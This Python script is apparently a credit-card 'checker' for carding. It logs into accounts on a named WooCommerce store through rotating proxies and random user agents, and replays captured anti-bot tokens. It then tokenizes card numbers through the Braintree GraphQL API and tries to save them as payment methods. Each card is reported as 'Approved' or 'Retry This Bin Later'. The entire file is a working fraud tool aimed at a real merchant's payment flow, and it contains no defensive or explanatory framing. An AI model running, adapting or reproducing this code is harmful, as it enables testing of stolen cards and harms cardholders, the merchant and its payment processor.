import requests
import json
import string
import re
from bs4 import BeautifulSoup
import base64
import random
from fake_useragent import UserAgent
import os
import time

def find_between(data, first, last):
    try:
        start = data.index(first) + len(first)
        end = data.index(last, start)
        return data[start:end]
    except ValueError:
        return None

def get_next_email(filename="emails.txt", state_file="state.txt"):
    try:
        with open(filename, "r", encoding="utf-8") as file:
            lines = [line.strip() for line in file if line.strip()]

        if not lines:
            return None  

        last_index = 0
        if os.path.exists(state_file):
            with open(state_file, "r") as sf:
                last_index = int(sf.read().strip() or 0)

        next_email = lines[last_index]

        new_index = (last_index + 1) % len(lines)  
        with open(state_file, "w") as sf:
            sf.write(str(new_index))

        return next_email

    except Exception as e:
        print("Error:", e)
        return None

def client_nonce(html_content):
    pattern = r'"client_token_nonce"\s*:\s*"([^"]+)"'
    match = re.search(pattern, html_content)
    return match.group(1) if match else None

def split_cc_details(cc):
    try:
        if "|" in cc and "/" in cc:
            raw_cc = cc.split("|")
            cc = raw_cc[0]
            cvc = raw_cc[2]
            mm, yy = raw_cc[1].split("/")
        elif "|" in cc:
            cc, mm, yy, cvc = cc.split("|")
        elif "/" in cc:
            cc, mm, yy, cvc = cc.split("/")
        else:
            raise ValueError("Invalid format. Expected '|' or '/' as separators.")
            if len(yy)==2:
                yy = f'20{yy}'
        return cc, mm, yy, cvc
    except Exception as e:
        return str(e)

def random_proxy():
    proxies = open("working_proxies.txt", "r").read().splitlines()
    proxy = random.choices(proxies)
    return proxy

def site_response(result):
    try:
        response = "Unknown Response ❌"  # Default value

        if 'Payment method successfully added.' in result or \
        'Nice! New payment method added' in result or \
        'Duplicate card exists in the vault.' in result or \
        'Status code avs: Gateway Rejected: avs' in result or \
        'Status code cvv: Gateway Rejected:' in result:
            response = "Approved ✅"

        elif 'Status code risk_threshold: Gateway Rejected: risk_threshold' in result:
            response = "Risk: Retry This Bin Later ❌"

        else:
            soup = BeautifulSoup(result, 'html.parser')
            error_elements = soup.find_all('ul', class_='woocommerce-error')
            
            for error_element in error_elements:
                for li in error_element.find_all('li'):
                    if 'Status code' in li.text:
                        response = li.text.strip() + ' ❌'

        return response  # Always return a response

    except Exception as e:
        return f"Error Occurred: {e}"  # Handle unexpected errors


def braintree_auth(cc):
    try:
        cc, mm, yy, cvc = split_cc_details(cc)
    except Exception as e:
        return str(e)
    
    useragent = UserAgent().random
    email = get_next_email()
    proxy = random_proxy()
    proxy = find_between(proxy, "['", "']")
    session = requests.session()
    proxies = {
    'http': f'http://{proxy}',
    }
    session.proxies.update(proxies)
    headers = {
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-IN,en;q=0.9',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://infinitediscsvipclub.com',
    'priority': 'u=0, i',
    'referer': 'https://infinitediscsvipclub.com/my-account/',
    'sec-ch-ua': '"Chromium";v="131", "Not_A Brand";v="24", "Microsoft Edge Simulate";v="131", "Lemur";v="131"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': useragent,
    }
    
    loginnonce = session.get("https://infinitediscsvipclub.com/my-account/", headers=headers)
    
    for i in loginnonce.text.splitlines():
        if "login-nonce" in i:
            lognonce = find_between(i, 'name="woocommerce-login-nonce" value="', '"')
    
    headers = {
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-IN,en;q=0.9',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://infinitediscsvipclub.com',
    'priority': 'u=0, i',
    'referer': 'https://infinitediscsvipclub.com/my-account/',
    'sec-ch-ua': '"Chromium";v="131", "Not_A Brand";v="24", "Microsoft Edge Simulate";v="131", "Lemur";v="131"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': useragent,
    }
    
    data = {
    'username': email,
    'password': email,
    'woocommerce-login-nonce': str(lognonce),
    '_wp_http_referer': '/my-account/',
    'login': 'Log in',
    'ct_bot_detector_event_token': '94893c789cae771284f3491ce40080fa163b4e398ba4c91f23475d03b8afdc08',
    }
    session.post('https://infinitediscsvipclub.com/my-account/', headers=headers, data=data)
    
    response = session.get("https://infinitediscsvipclub.com/my-account/payment-methods/", headers=headers)
    for i in response.text.splitlines():
        if 'client_token_nonce'and 'credit-card' in i:
            cnonce = client_nonce(i)
    response = session.get("https://infinitediscsvipclub.com/my-account/add-payment-method/", headers=headers)
    for p in response.text.splitlines():
        if "add-payment-method-nonce" in p:
            pnonce = find_between(p, 'name="woocommerce-add-payment-method-nonce" value="', '"')
    data = {
    'action': 'wc_braintree_credit_card_get_client_token',
    'nonce': cnonce,
    }
    result = session.post('https://infinitediscsvipclub.com/wp-admin/admin-ajax.php', headers=headers, data=data)
    authorization=result.json()['data']
    decoded_authorization = base64.b64decode(authorization).decode('utf-8')
    data_dict = json.loads(decoded_authorization)
    if data_dict:
        try:
            bearer = data_dict.get('authorizationFingerprint', None)
        except json.JSONDecodeError as e:
            print(f"Error While Bearer Fetching")   
    headers = {
    'accept': '*/*',
    'accept-language': 'en-IN,en;q=0.9',
    'authorization': f'Bearer {bearer}',
    'braintree-version': '2018-05-10',
    'content-type': 'application/json',
    'origin': 'https://assets.braintreegateway.com',
    'priority': 'u=1, i',
    'referer': 'https://assets.braintreegateway.com/',
    'sec-ch-ua': '"Chromium";v="131", "Not_A Brand";v="24", "Microsoft Edge Simulate";v="131", "Lemur";v="131"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': useragent,
    }
    json_data = {
    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'custom',
        'sessionId': '0f2c0e9d-2e67-48b8-a4f3-5fbd39396530',
    },
    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
    'variables': {
        'input': {
            'creditCard': {
                'number': cc,
                'expirationMonth': mm,
                'expirationYear': yy,
                'cvv': cvc,
            },
            'options': {
                'validate': False,
            },
        },
    },
    'operationName': 'TokenizeCreditCard',
    }
    response = session.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
    try:
        id = response.json()['data']['tokenizeCreditCard']['token']
    except:
        return(response.text)
    headers = {
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-IN,en;q=0.9',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://infinitediscsvipclub.com',
    'priority': 'u=0, i',
    'referer': 'https://infinitediscsvipclub.com/my-account/add-payment-method/',
    'sec-ch-ua': '"Chromium";v="131", "Not_A Brand";v="24", "Microsoft Edge Simulate";v="131", "Lemur";v="131"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': useragent,
    }
    
    data = [
    ('payment_method', 'braintree_credit_card'),
    ('wc-braintree-credit-card-card-type', 'visa'),
    ('wc-braintree-credit-card-3d-secure-enabled', ''),
    ('wc-braintree-credit-card-3d-secure-verified', ''),
    ('wc-braintree-credit-card-3d-secure-order-total', '0.00'),
    ('wc_braintree_credit_card_payment_nonce', id),
    ('wc_braintree_device_data', '{"correlation_id":"6dd347c5a21fbbc0f532907498d50a9a"}'),
    ('wc-braintree-credit-card-tokenize-payment-method', 'true'),
    ('wc_braintree_paypal_payment_nonce', ''),
    ('wc_braintree_device_data', '{"correlation_id":"6dd347c5a21fbbc0f532907498d50a9a"}'),
    ('wc-braintree-paypal-context', 'shortcode'),
    ('wc_braintree_paypal_amount', '0.00'),
    ('wc_braintree_paypal_currency', 'USD'),
    ('wc_braintree_paypal_locale', 'en_us'),
    ('wc-braintree-paypal-tokenize-payment-method', 'true'),
    ('woocommerce-add-payment-method-nonce', pnonce),
    ('_wp_http_referer', '/my-account/add-payment-method/'),
    ('woocommerce_add_payment_method', '1'),
    ('apbct_visible_fields', 'eyIwIjp7InZpc2libGVfZmllbGRzIjoiIiwidmlzaWJsZV9maWVsZHNfY291bnQiOjAsImludmlzaWJsZV9maWVsZHMiOiJ3Yy1icmFpbnRyZWUtY3JlZGl0LWNhcmQtY2FyZC10eXBlIHdjLWJyYWludHJlZS1jcmVkaXQtY2FyZC0zZC1zZWN1cmUtZW5hYmxlZCB3Yy1icmFpbnRyZWUtY3JlZGl0LWNhcmQtM2Qtc2VjdXJlLXZlcmlmaWVkIHdjLWJyYWludHJlZS1jcmVkaXQtY2FyZC0zZC1zZWN1cmUtb3JkZXItdG90YWwgd2NfYnJhaW50cmVlX2NyZWRpdF9jYXJkX3BheW1lbnRfbm9uY2Ugd2NfYnJhaW50cmVlX2RldmljZV9kYXRhIHdjLWJyYWludHJlZS1jcmVkaXQtY2FyZC10b2tlbml6ZS1wYXltZW50LW1ldGhvZCB3Y19icmFpbnRyZWVfcGF5cGFsX3BheW1lbnRfbm9uY2Ugd2NfYnJhaW50cmVlX2RldmljZV9kYXRhIHdjLWJyYWludHJlZS1wYXlwYWwtY29udGV4dCB3Y19icmFpbnRyZWVfcGF5cGFsX2Ftb3VudCB3Y19icmFpbnRyZWVfcGF5cGFsX2N1cnJlbmN5IHdjX2JyYWludHJlZV9wYXlwYWxfbG9jYWxlIHdjLWJyYWludHJlZS1wYXlwYWwtdG9rZW5pemUtcGF5bWVudC1tZXRob2Qgd29vY29tbWVyY2UtYWRkLXBheW1lbnQtbWV0aG9kLW5vbmNlIF93cF9odHRwX3JlZmVyZXIgd29vY29tbWVyY2VfYWRkX3BheW1lbnRfbWV0aG9kIGN0X25vX2Nvb2tpZV9oaWRkZW5fZmllbGQiLCJpbnZpc2libGVfZmllbGRzX2NvdW50IjoxOH19'),
    ('ct_bot_detector_event_token', '94893c789cae771284f3491ce40080fa163b4e398ba4c91f23475d03b8afdc08'),
    ('ct_no_cookie_hidden_field', '_ct_no_cookie_data_eyJjdF9zY3JlZW5faW5mbyI6IntcImZ1bGxXaWR0aFwiOjYwMixcImZ1bGxIZWlnaHRcIjoxMDg5LFwidmlzaWJsZVdpZHRoXCI6NjAyLFwidmlzaWJsZUhlaWdodFwiOjgzOX0iLCJjdF9tb3VzZV9tb3ZlZCI6dHJ1ZSwiYXBiY3RfcGl4ZWxfdXJsIjoiaHR0cHM6Ly9tb2RlcmF0ZTktdjQuY2xlYW50YWxrLm9yZy9waXhlbC8yMzc1MzJjMGU5MDY3NTQ3NTMyMzI1NTMyNjY5NzNkZS5naWYiLCJjdF9jaGVja2pzIjoxNTc1MzgyNjI1LCJjdF90aW1lem9uZSI6NS41LCJjdF9oYXNfc2Nyb2xsZWQiOnRydWUsImN0X2Nvb2tpZXNfdHlwZSI6Im5vbmUiLCJhcGJjdF92aXNpYmxlX2ZpZWxkcyI6IntcInZpc2libGVfZmllbGRzXCI6XCJcIixcInZpc2libGVfZmllbGRzX2NvdW50XCI6MCxcImludmlzaWJsZV9maWVsZHNcIjpcIndjLWJyYWludHJlZS1jcmVkaXQtY2FyZC1jYXJkLXR5cGUgd2MtYnJhaW50cmVlLWNyZWRpdC1jYXJkLTNkLXNlY3VyZS1lbmFibGVkIHdjLWJyYWludHJlZS1jcmVkaXQtY2FyZC0zZC1zZWN1cmUtdmVyaWZpZWQgd2MtYnJhaW50cmVlLWNyZWRpdC1jYXJkLTNkLXNlY3VyZS1vcmRlci10b3RhbCB3Y19icmFpbnRyZWVfY3JlZGl0X2NhcmRfcGF5bWVudF9ub25jZSB3Y19icmFpbnRyZWVfZGV2aWNlX2RhdGEgd2MtYnJhaW50cmVlLWNyZWRpdC1jYXJkLXRva2VuaXplLXBheW1lbnQtbWV0aG9kIHdjX2JyYWludHJlZV9wYXlwYWxfcGF5bWVudF9ub25jZSB3Y19icmFpbnRyZWVfZGV2aWNlX2RhdGEgd2MtYnJhaW50cmVlLXBheXBhbC1jb250ZXh0IHdjX2JyYWludHJlZV9wYXlwYWxfYW1vdW50IHdjX2JyYWludHJlZV9wYXlwYWxfY3VycmVuY3kgd2NfYnJhaW50cmVlX3BheXBhbF9sb2NhbGUgd2MtYnJhaW50cmVlLXBheXBhbC10b2tlbml6ZS1wYXltZW50LW1ldGhvZCB3b29jb21tZXJjZS1hZGQtcGF5bWVudC1tZXRob2Qtbm9uY2UgX3dwX2h0dHBfcmVmZXJlciB3b29jb21tZXJjZV9hZGRfcGF5bWVudF9tZXRob2QgYXBiY3RfdmlzaWJsZV9maWVsZHMgY3RfYm90X2RldGVjdG9yX2V2ZW50X3Rva2VuIGN0X25vX2Nvb2tpZV9oaWRkZW5fZmllbGRcIixcImludmlzaWJsZV9maWVsZHNfY291bnRcIjoyMH0iLCJjdF9wc190aW1lc3RhbXAiOjE3NDA5MzM0MzcsImN0X2JvdF9kZXRlY3Rvcl9mb3JtX2V4Y2x1c2lvbiI6dHJ1ZSwiY3RfaGFzX2lucHV0X2ZvY3VzZWQiOiJ0cnVlIiwiY3RfcG9pbnRlcl9kYXRhIjoiW1s2ODcsNDU4LDExODY3Nl1dIiwiYXBiY3RfcGFnZV9oaXRzIjoyMSwiY3RfaGFzX2tleV91cCI6InRydWUiLCJhcGJjdF9oZWFkbGVzcyI6ZmFsc2UsImN0X2ZrcF90aW1lc3RhbXAiOjE3NDA5MzM1NTQsImN0X2NoZWNrZWRfZW1haWxzIjoiMCIsImFwYmN0X3Nlc3Npb25faWQiOiJzeG1ra3IiLCJhcGJjdF9zZXNzaW9uX2N1cnJlbnRfcGFnZSI6Imh0dHBzOi8vaW5maW5pdGVkaXNjc3ZpcGNsdWIuY29tL215LWFjY291bnQvYWRkLXBheW1lbnQtbWV0aG9kLyIsImFwYmN0X3ByZXZfcmVmZXJlciI6Imh0dHBzOi8vaW5maW5pdGVkaXNjc3ZpcGNsdWIuY29tL215LWFjY291bnQvcGF5bWVudC1tZXRob2RzLyIsInR5cG8iOltdLCJmb3JtX2RlY29yYXRpb25fbW91c2VfZGF0YSI6W119'),
    ]
    response = session.post(
    'https://infinitediscsvipclub.com/my-account/add-payment-method/',
    headers=headers,
    data=data,
    ).text
    result = site_response(response)
    time.sleep(10)
    return result